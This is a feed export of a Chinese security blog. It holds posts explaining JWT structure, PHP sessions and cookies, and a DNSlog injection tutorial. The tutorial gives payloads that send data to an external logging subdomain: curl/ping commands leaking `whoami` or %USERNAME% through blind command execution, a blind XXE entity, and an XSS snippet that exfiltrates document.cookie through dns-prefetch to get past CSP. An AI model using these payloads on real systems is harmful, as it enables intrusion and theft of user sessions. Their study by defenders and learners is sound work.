header"></a>1. header</h4><p>jwt的头部承载两部分信息：</p><ul><li>声明类型，这里是jwt</li><li>声明加密的算法 通常直接使用 HMAC SHA256</li></ul><p>完整的头部就像下面这样的JSON：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">'typ'</span>: <span class="string">'JWT'</span>,</span><br><span class="line">  <span class="string">'alg'</span>: <span class="string">'HS256'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure><h4 id="2-playload"><a href="#2-playload" class="headerlink" title="2. playload"></a>2. playload</h4><p>载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分</p><ul><li>标准中注册的声明</li><li>公共的声明</li><li>私有的声明</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"sub"</span>: <span class="string">"1234567890"</span>,</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"John Doe"</span>,</span><br><span class="line">  <span class="attr">"admin"</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后将其进行base64加密，得到Jwt的第二部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure><h4 id="3-signature"><a href="#3-signature" class="headerlink" title="3.signature"></a>3.signature</h4><p>jwt的第三部分是一个签证信息，这个签证信息由三部分组成：</p><ul><li>header (base64后的)</li><li>payload (base64后的)</li><li>secret</li></ul><p>这个部分需要base64加密后的header和base64加密后的payload使用<code>.</code>连接组成的字符串，然后通过header中声明的加密方式进行加盐<code>secret</code>组合加密，然后就构成了jwt的第三部分。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"><span class="keyword">var</span> encodedString = base64UrlEncode(header) + <span class="string">'.'</span> + base64UrlEncode(payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> signature = HMACSHA256(encodedString, <span class="string">'secret'</span>); <span class="comment">// TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></table></figure><p>将这三部分用<code>.</code>连接成一个完整的字符串,构成了最终的jwt:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="selector-class">.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><span class="selector-class">.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span></span><br></pre></td></tr></table></figure><blockquote><p>secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。</p></blockquote><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这里简单做一下关于这几篇博客的小结：</p><ul><li>基于cookie/session的是身份认证方式。</li><li>基于token的也是身份认证方式。</li><li>JWT是基于token身份认证的一种具体形式。</li></ul><h2 id="0x04-参考连接"><a href="#0x04-参考连接" class="headerlink" title="0x04 参考连接"></a>0x04 参考连接</h2><p><a href="https://www.jianshu.com/p/576dbf44b2ae" target="_blank" rel="noopener">https://www.jianshu.com/p/576dbf44b2ae</a> </p><p><a href="https://www.cnblogs.com/xiangkejin/p/9011119.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiangkejin/p/9011119.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;JWT&quot;&gt;&lt;a href=&quot;#JWT&quot; class=&quot;headerlink&quot; title=&quot;JWT&quot;&gt;&lt;/a&gt;JWT&lt;/h2&gt;&lt;p&gt;上面两篇博客我们使用的是基于cookie/session来进行&lt;strong&gt;身份认证&lt;/strong&gt;。今天就来说一说基于toke
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Session</title>
    <link href="http://bai-ren-1.github.io/2020/03/22/Session/"/>
    <id>http://bai-ren-1.github.io/2020/03/22/Session/</id>
    <published>2020-03-22T03:54:08.000Z</published>
    <updated>2020-03-22T06:37:34.527Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><p>作为上一篇的兄弟篇，这一篇主要说明服务端对于用户标识的做法。session的具体用法和参数，这里我就详细的记录下来。</p><h2 id="0x00-初探Session"><a href="#0x00-初探Session" class="headerlink" title="0x00 初探Session"></a>0x00 初探Session</h2><p>在php中，我们可以通过phpinfo获取到session保存的位置：</p><p><img src="/2020/03/22/Session/1.png" alt></p><p>可以看出php服务端在开启会话后，会发送一个名字为PHPSESSID的session标识给我们客户端，用于作为“钥匙”获取服务端的数据。然后我们可以看到服务端通过文件形式将session保存在tmp路径下。我新建一个1.php用于开启一个会话：</p><p><img src="/2020/03/22/Session/2.png" alt></p><p>1.php下通过session_start开启一个session，然后我们通过浏览器对其进行访问，看session保存路径下是否会生成新的session文件。可见原先我们该路径下的文件夹是空的：</p><p><img src="/2020/03/22/Session/Session%5C3.png" alt></p><p>然后我们访问localhost/1.php，在cookie字段下面多了一个名为PHPSESSID的键：</p><p><img src="/2020/03/22/Session/4.png" alt></p><p>然后我们到session路径下查看，就能发现在该路径下确实生成了一个session文件，其名称包含了cookie下的对应的键值：</p><p><img src="/2020/03/22/Session/5.png" alt></p><blockquote><p>服务端通过客户端的浏览器标识客户，所以即使同一台客户端主机，开启不同的浏览器访问会获得不同的session。</p></blockquote><p>综上所述，当服务端php使用session_start开启了一个会话后，就会给访这个页面的浏览器发布一个</p><p>sessionid存放在客户端cookie内，其键名为PHPSESSID。</p><p>我们有了存放在服务端的session文件，那客户端是怎么通过PHPSESSID获取到里面的内容的呢？</p><p><img src="/2020/03/22/Session/6.png" alt></p><p>我们首先刷新请求，可以看到请求头里带上了cookie字段。服务器接收到cookie的数据后，就会打开对应的session文件并返回给客户端。这个的具体演示就看下一章的实验。</p><h2 id="0x01-Session内容"><a href="#0x01-Session内容" class="headerlink" title="0x01 Session内容"></a>0x01 Session内容</h2><p>把1.php的源码修改为给超全局数组$_SESSION中写入一个键值并打印数组内容：</p><p><img src="/2020/03/22/Session/8.png" alt></p><p>我们重新刷新页面，可以看到$_SESSION数组的值被打印出来：</p><p><img src="/2020/03/22/Session/7.png" alt></p><p>我们得看看存储在服务端的session的文件是什么形式存储数据的呢？</p><p><img src="/2020/03/22/Session/9.png" alt></p><p>可见在服务端的session文件里存储了序列化形式数据。</p><blockquote><p>综上，当客户端第一次访问到服务端该页面时，服务端会执行session_start启动一个session。执行后服务器会在保存路径下生成一个空的session用于保存数据，并且在给客户端返回一个PHPSESSID保存在cookie中（好像sessonid不一定是保留客户端的cookie中，也可以是其他地方）。然后程序继续执行，往$_SESSION数组中里面写入值，服务端会自动取出里面内容并用序列化的形式保存至对应的会话文件中。然后只要客户端带着这个PHPSESSID来访问服务端，服务端就会给其返回对应的session文件对应的内容。</p></blockquote><h2 id="0x02-共享Session"><a href="#0x02-共享Session" class="headerlink" title="0x02 共享Session"></a>0x02 共享Session</h2><p>我想在另一个文件里面也使用这个session，该怎么操作？新建2.php，内容如下：</p><p><img src="/2020/03/22/Session/10.png" alt></p><p>然后我带着刚刚的PHPSESSID访问2.php：</p><p><img src="/2020/03/22/Session/11.png" alt></p><p>session文件里面会多了一条序列化数据：</p><p><img src="/2020/03/22/Session/12.png" alt></p><blockquote><p>在另一个文件中使用session_start开启会话，如果请求头中cookie带有PHPSESSID，就不会生成新的session文件，而是会找到ID对应的文件并进行操作，达成不同文件共享会话session的目的。</p></blockquote><h2 id="0x03-删除Session"><a href="#0x03-删除Session" class="headerlink" title="0x03 删除Session"></a>0x03 删除Session</h2><p>然后我们可以通过unset属性或者直接将session设置为空来清空session。首先修改2.php，我们给他赋值age属性后立马将session里面的name属性删除：</p><p><img src="/2020/03/22/Session/13.png" alt></p><p>清除之前实验的session重新开始，我们访问1.php查看结果，和之前实验一样生成了session文件并写入了name属性：</p><p><img src="/2020/03/22/Session/14.png" alt></p><p>然后我们再访问2.php看结果如何？由下图的结果我们可以分析出，访问2.php后在同一个session下写入age属性并打印出结果。在浏览器上我们能看到两个属性：</p><p><img src="/2020/03/22/Session/15.png" alt></p><p>那2.php执行完后的session文件中的属性是什么样的呢？如我们所料，原来的session中的name属性被我们删除了。现在session文件里面只剩下了age属性。</p><p><img src="/2020/03/22/Session/16.png" alt></p><p>然后我们在做最后一步验证，看访问1.php会打印出什么内容：</p><p><img src="/2020/03/22/Session/17.png" alt></p><p>因为1.php的执行流程是重新写入name属性再打印出结果，由键值顺序我们就能看出。刚刚的删除操作是成功执行了。</p><blockquote><p>综上，两个不同文件都是用使用session_start就能使用同一个会话。当我们需要删除会话属性时，可以使用unset或者直接赋值$_SESSION为空来做到。</p></blockquote><h2 id="0x04-Session-amp-Cookie"><a href="#0x04-Session-amp-Cookie" class="headerlink" title="0x04 Session&amp;Cookie"></a>0x04 Session&amp;Cookie</h2><p>当然下面的结论是使用setcookie和session_start得到的，其他语言或者其他函数我就这里就不继续做了。</p><ul><li><p><strong>cookie</strong>是服务端通过setcookie直接给客户端的cookie字段中加入了的标识用户的数据，即<strong>标识用户的数据存储在客户端中</strong>。</p></li><li><p><strong>session</strong>是服务端通过session_start给客户端cookie字段（也可能是客户端其他地方）中加入了获取标识用户数据的“钥匙”即sessionid，客户端通过这把钥匙才能在服务端上对应的session文件上获得用户的数据。<strong>即标识用户的数据存在了服务端，但用户需要sessionid这把本地“钥匙”才能进行获取</strong>。</p></li></ul><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>session和cookie的博客就先写到这里。后面看看把tokn给补充上来，完成三杀。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Session&quot;&gt;&lt;a href=&quot;#Session&quot; class=&quot;headerlink&quot; title=&quot;Session&quot;&gt;&lt;/a&gt;Session&lt;/h1&gt;&lt;p&gt;作为上一篇的兄弟篇，这一篇主要说明服务端对于用户标识的做法。session的具体用法和参数，这里我就
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Cookie</title>
    <link href="http://bai-ren-1.github.io/2020/03/22/Cookie/"/>
    <id>http://bai-ren-1.github.io/2020/03/22/Cookie/</id>
    <published>2020-03-22T03:07:49.000Z</published>
    <updated>2020-03-22T06:23:53.539Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>拿php做一个简单的实验，分析cookie的各个选项的作用并加深理解。</p><h2 id="0x00-修改hosts"><a href="#0x00-修改hosts" class="headerlink" title="0x00 修改hosts"></a>0x00 修改hosts</h2><ul><li>hosts作用：就是将一些常用的网址域名与其对应的IP地址建立一个关联。</li><li>hosts文件路径：C:\windows\system32\drivers\etc\hosts 。</li></ul><p><img src="/2020/03/22/Cookie/1.png" alt></p><p>这里我设置两个shabi.com的子域，都指向了同一个地址（为了区分cookie作用域选项）。然后我们开启wampserver，就可以开始实验了。</p><h2 id="0x01-设置cookie"><a href="#0x01-设置cookie" class="headerlink" title="0x01 设置cookie"></a>0x01 设置cookie</h2><p>我们的主文件1.php通过setcookie进行cookie的设置，而同目录下的2.php是通过print_r($_COOKIE)使用超全局变量数组将cookie打印出来：</p><p><img src="/2020/03/22/Cookie/2.png" alt></p><p>其中setcookie中的每个选项的作用如下图所示：</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">name</td><td align="left">必需。规定 cookie 的名称。</td></tr><tr><td align="left">value</td><td align="left">必需。规定 cookie 的值。</td></tr><tr><td align="left">expire</td><td align="left">可选。规定 cookie 的有效期。</td></tr><tr><td align="left">path</td><td align="left">可选。规定 cookie 的服务器路径。</td></tr><tr><td align="left">domain</td><td align="left">可选。规定 cookie 的域名。</td></tr><tr><td align="left">secure</td><td align="left">可选。规定是否通过安全的HTTPS连接来传输cookie。</td></tr><tr><td align="left">httponly</td><td align="left">可选。当true时cookie仅能通过http协议访问。JS等脚本语言无法访问cookie。</td></tr></tbody></table><ul><li>expire： 指定cookie的过期时间。0或未指定时会默认当前会话为有效期，关闭浏览器后cookie会被清除。 </li><li>path： cookie的有效路径。当设置’/‘时有效路径为根目录，所有根目录和子目录都可以访问；设置为’/shabi/‘时是指只有根目录下的shabi文件夹中的网页和/shabi/下子目录的网页才能访问到 </li></ul><h2 id="0x02-验证cookie属性"><a href="#0x02-验证cookie属性" class="headerlink" title="0x02 验证cookie属性"></a>0x02 验证cookie属性</h2><p>直接访问wo.shabi.com的1.php我们获取到我们的cookie：</p><p><img src="/2020/03/22/Cookie/3.png" alt><br>我们直接在console下面的Application字段可以看到我们的cookie的键和值。我们来具体实验一下其他选项的配置。</p><ul><li>Domain</li></ul><p>Domain我们设置其为shabi.com，即该域名的子域下该cookie仍会存在，我们通过访问ni.shabi.com的2.php，看能否将cookie打印出来：</p><p><img src="/2020/03/22/Cookie/4.png" alt></p><p>可见只要在shabi.com的子域下，子域间的cookie是可以被共享的。</p><ul><li>httponly</li></ul><p>httponly限制了脚本语言对cookie的读取。我们已经写好了js.html，他的内容是console.log(document.cookie)将cookie打印在控制台上。我们访问wo.shabi.com/js.html：</p><p><img src="/2020/03/22/Cookie/5.png" alt></p><p>可见我们的JS不能读取到cookie的内容，该行的结果为空。</p><ul><li>expire</li></ul><p>上面我将expire设置为0，0或者空会将cookie的作用时间设置为该会话。即只要会话结束，cookie就会失效。现在我们的cookie还在作用中：</p><p><img src="/2020/03/22/Cookie/6.png" alt></p><p>然后关闭浏览器后重新访问wo.shabi.com/2.php：</p><p><img src="/2020/03/22/Cookie/7.png" alt></p><p>可以看到我们的cookie数组已经为空了，因为前一个cookie的会话被关闭，导致前一个cookie已经失效。</p><h2 id="0x02-cookie性质"><a href="#0x02-cookie性质" class="headerlink" title="0x02 cookie性质"></a>0x02 cookie性质</h2><ul><li>Cookie实际上是一小段的文本信息。客户端请求服务器，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。</li><li>客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。</li><li>Cookie是不可跨域名的。域名<a href="http://www.google.com颁发的Cookie不会被提交到域名www.baidu.com去。该性质是由Cookie的隐私安全机制决定的。隐私安全机制能够禁止网站非法获取其他网站的Cookie。" target="_blank" rel="noopener">www.google.com颁发的Cookie不会被提交到域名www.baidu.com去。该性质是由Cookie的隐私安全机制决定的。隐私安全机制能够禁止网站非法获取其他网站的Cookie。</a> </li></ul><blockquote><p>假如现在我有个恶意网站，想诱骗用户点击骗取他在另一个网站的cookie，这是不能做到的。因为他的cookie是在另一个网站，当他访问我们的恶意网站时请求头是不会带上这个跨域的cookie的。这就是XSS跨站的意思，它通过JS的src之类的跨站属性，再搭配对cookie的读取，就能成功让该网站的cookie跨到我们的恶意网站上。</p></blockquote><p><strong>综上，cookie就是把用户状态记录并保存在客户端上来标识用户的字段。具有不可跨域性。</strong></p><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这里只是做了个很简单的实验，其他选项的时候做了但是觉得没必要一直写。这两个兄弟篇主要是为了将cookie和session区分开来。下一篇继续写上session的实验。继续加油吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Cookie&quot;&gt;&lt;a href=&quot;#Cookie&quot; class=&quot;headerlink&quot; title=&quot;Cookie&quot;&gt;&lt;/a&gt;Cookie&lt;/h1&gt;&lt;p&gt;拿php做一个简单的实验，分析cookie的各个选项的作用并加深理解。&lt;/p&gt;
&lt;h2 id=&quot;0x00-修
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>DNSlog注入</title>
    <link href="http://bai-ren-1.github.io/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/"/>
    <id>http://bai-ren-1.github.io/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/</id>
    <published>2020-03-19T07:10:32.000Z</published>
    <updated>2020-03-21T04:51:39.751Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h1><p>emmm，就写一写DNS log注入吧。有挺多利用方式的，都是为了盲打的效果。只要能在漏洞上通过某些方法<strong>发出一个请求</strong>，就能达成盲打的效果。</p><h2 id="0x00-DNS-log平台"><a href="#0x00-DNS-log平台" class="headerlink" title="0x00 DNS log平台"></a>0x00 DNS log平台</h2><p>这个就详细地介绍一下，首先我们登录到  <a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a>  注册并登录，这个是知道创宇建立的一个平台。具体的使用情况说明在里面可以看到详细的解释。随后我们点开个人信息页面，可以看到有个标识符的字段，这是用来标识你这身份的依据：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/1.png" alt></p><blockquote><p> 对于每个用户，有六个随机字符的唯一标识符代码和唯一子域值，可以在配置文件页面中找到。记录了对该子域及其所有内容的所有DNS查询和HTTP请求。</p><p>例如，<code>b182oj</code>是某人的唯一标识符代码，并且<code>b182oj.ceye.io</code>是他/她的子域。对于所有的DNS quries和HTTP请求<code>b182oj.ceye.io</code>和<code>*.b182oj.ceye.io</code>将被记录。</p></blockquote><p>上面就是关于域名标识的用法解释，很简单明了了，随后我们具体做个简单实验。</p><p>访问<a href="http://dashabi.xxxxx.ceye.io，这里面的DNS解析原理我就不用多说了，不会可以去看计网基础。然后我们就能在查询记录里面看到对应的结果：" target="_blank" rel="noopener">http://dashabi.xxxxx.ceye.io，这里面的DNS解析原理我就不用多说了，不会可以去看计网基础。然后我们就能在查询记录里面看到对应的结果：</a></p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/3.png" alt></p><p>除了DNS查询记录里面的记录，平台还提供了http查询查询功能：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/4.png" alt></p><p>可以看到我们发出了两个http请求，分别请求了网站和网站图标。初步实验结束，平台强大，进入使用。</p><h2 id="0x01-SQL盲注"><a href="#0x01-SQL盲注" class="headerlink" title="0x01 SQL盲注"></a>0x01 SQL盲注</h2><p>如遇到MySql的盲注时，可以利用内置函数<code>load_file()</code>来完成DNSLOG。<strong>load_file()</strong>不仅能够加载本地文件，同时也能对诸如<code>\\www.test.com</code>这样的URL<strong>发起请求</strong>。 </p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/5.png" alt></p><p>基本的表信息结构如上图所示。我们使用DNS log注入需要用到一个重要参数：<code>secure_file_priv</code></p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/6.png" alt></p><blockquote><p>当secure_file_priv为空，就可以读取磁盘的目录。</p><p>当secure_file_priv为G:\，就可以读取G盘的文件。</p><p>当secure_file_priv为null，load_file就不能加载文件。</p><p>具体的配置在 my.ini 中可以进行设置</p></blockquote><p>我将secure_file_priv修改为空，然后可以进入正题了，我们通过下面这种payload：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/9.png" alt></p><blockquote><p>经实验前面不是四个反斜杠会无法得到请求，并且后面不加uri也会得不到请求；</p><p>有选中数据库，但命令行下发不出请求，用sqlyog就能成功发出；</p></blockquote><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/10.png" alt></p><blockquote><p>我们通过load_file发出请求，请求的内容用concat进行拼接：前面四个反斜杠是为了转义成两个斜杠，然后拼上数据库查询，后面就是DNSlog的域名。</p></blockquote><p>相应的我们把想查询的内容放在对应位置即可。</p><h2 id="0x01-无回显命令执行"><a href="#0x01-无回显命令执行" class="headerlink" title="0x01 无回显命令执行"></a>0x01 无回显命令执行</h2><p>命令执行可以通过搭配<strong>curl或者ping发出请求</strong>命令来达成无回显获取信息的目的。</p><p>LINUX平台下payload的形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`whoami`</span><br><span class="line">ping `whoami`.ip.port.b182oj.ceye.io</span><br></pre></td></tr></table></figure><p>Windows平台下payload的形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.b182oj.ceye.io</span><br></pre></td></tr></table></figure><p>附上Windows平台下重要变量的值：</p><table><thead><tr><th>变量</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>%ALLUSERSPROFILE%</td><td>本地</td><td>返回“所有用户”配置文件的位置。</td></tr><tr><td>%APPDATA%</td><td>本地</td><td>返回默认情况下应用程序存储数据的位置。</td></tr><tr><td>%CD%</td><td>本地</td><td>返回当前目录字符串。</td></tr><tr><td>%CMDCMDLINE%</td><td>本地</td><td>返回用来启动当前的 Cmd.exe 的准确命令行。</td></tr><tr><td>%CMDEXTVERSION%</td><td>系统</td><td>返回当前的“命令处理程序扩展”的版本号。</td></tr><tr><td>%COMPUTERNAME%</td><td>系统</td><td>返回计算机的名称。</td></tr><tr><td>%COMSPEC%</td><td>系统</td><td>返回命令行解释器可执行程序的准确路径。</td></tr><tr><td>%DATE%</td><td>系统</td><td>返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</td></tr><tr><td>%ERRORLEVEL%</td><td>系统</td><td>返回上一条命令的错误代码。通常用非零值表示错误。</td></tr><tr><td>%HOMEDRIVE%</td><td>系统</td><td>返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>%HOMEPATH%</td><td>系统</td><td>返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>%HOMESHARE%</td><td>系统</td><td>返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</td></tr><tr><td>%LOGONSERVER%</td><td>本地</td><td>返回验证当前登录会话的域控制器的名称。</td></tr><tr><td>%NUMBER_OF_PROCESSORS%</td><td>系统</td><td>指定安装在计算机上的处理器的数目。</td></tr><tr><td>%OS%</td><td>系统</td><td>返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</td></tr><tr><td>%PATH%</td><td>系统</td><td>指定可执行文件的搜索路径。</td></tr><tr><td>%PATHEXT%</td><td>系统</td><td>返回操作系统认为可执行的文件扩展名的列表。</td></tr><tr><td>%PROCESSOR_ARCHITECTURE%</td><td>系统</td><td>返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</td></tr><tr><td>%PROCESSOR_IDENTFIER%</td><td>系统</td><td>返回处理器说明。</td></tr><tr><td>%PROCESSOR_LEVEL%</td><td>系统</td><td>返回计算机上安装的处理器的型号。</td></tr><tr><td>%PROCESSOR_REVISION%</td><td>系统</td><td>返回处理器的版本号。</td></tr><tr><td>%PROMPT%</td><td>本地</td><td>返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</td></tr><tr><td>%RANDOM%</td><td>系统</td><td>返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。</td></tr><tr><td>%SYSTEMDRIVE%</td><td>系统</td><td>返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</td></tr><tr><td>%SYSTEMROOT%</td><td>系统</td><td>返回 Windows server operating system 根目录的位置。</td></tr><tr><td>%TEMP%和%TMP%</td><td>系统和用户</td><td>返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</td></tr><tr><td>%TIME%</td><td>系统</td><td>返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。</td></tr><tr><td>%USERDOMAIN%</td><td>本地</td><td>返回包含用户帐户的域的名称。</td></tr><tr><td>%USERNAME%</td><td>本地</td><td>返回当前登录的用户的名称。</td></tr><tr><td>%USERPROFILE%</td><td>本地</td><td>返回当前用户的配置文件的位置。</td></tr><tr><td>%WINDIR%</td><td>系统</td><td>返回操作系统目录的位置。</td></tr></tbody></table><p>做个简单的实验，通过ping命令查询拼接了%USERNAME%的域名，就能通过命令执行获取到主机的用户名信息：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/11.png" alt></p><p>在平台上就能接收到结果了：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/12.png" alt></p><h2 id="0x02-XXE盲打"><a href="#0x02-XXE盲打" class="headerlink" title="0x02 XXE盲打"></a>0x02 XXE盲打</h2><p>直接上payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test"&gt;</span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-绕CSP打XSS拿cookie"><a href="#0x03-绕CSP打XSS拿cookie" class="headerlink" title="0x03 绕CSP打XSS拿cookie"></a>0x03 绕CSP打XSS拿cookie</h2><p>CSP(内容安全策略)是防御XSS最有效的手段之一。当我们发现一个网站有XSS漏洞，想利用XSS平台来打Cookie时，CSP会通过白名单的方式，禁止跨域加载脚本，恶意代码便会因此被阻挡在门外，导致此XSS无法利用。对此，我们可以使用DNS预解析突破CSP的阻拦。 </p><blockquote><p> DNS预解析(DNS Prefetching)是一种能够加快网页加载速度的技术，对于跨站的链接，由于每次都要进行一次DNS解析，会消耗掉很多时间。DNS预解析在浏览器空闲时，将跨站资源的域名转化为IP 地址并缓存，真正请求资源时就避免了解析的时间。 </p></blockquote><p>DNS预解析是默认开启的，并且我们可以通过<code>rel=&quot;dns-prefetch&quot;</code>来强制进行DNS预解析。由于<strong>DNS预解析可以绕过CSP进行解析</strong>，结合DNSLOG，我们即可窃取在CSP保护下的Cookie。 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.querySelector('body').innerHTML += "<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'dns-prefetch'</span> <span class="attr">href</span>=<span class="string">'" + window.btoa(document.cookie.split(/;|=/)[1]) + ".b182oj.ceye.io'</span>&gt;</span>"</span><br></pre></td></tr></table></figure><blockquote><p> document.querySelector(‘body’)获取文档中 “body” 的元素然后 += 添加上DNS预解析标签；</p><p>预解析标签指向的地址是分割符号后出来的并经过window.btoa进行b64编码的cookie作为二级域名的域名；</p></blockquote><p>上面的Payload将Cookie中截取的重要字段进行简单的base64编码后，作为我们DNSLOG平台的二级域名，并在body中插入了相应的link标签对此域名进行强制DNS预解析。当触发XSS攻击时，可以在Web控制台下看到结 </p><h2 id="0x04-DNS解绑定绕SSRF"><a href="#0x04-DNS解绑定绕SSRF" class="headerlink" title="0x04 DNS解绑定绕SSRF"></a>0x04 DNS解绑定绕SSRF</h2><p>在ceye.io平台上也提供了DNS解绑定的功能。下图是SSRF解绑定攻击流程：</p><p><img src="/2020/03/19/DNSlog%E6%B3%A8%E5%85%A5/13.png" 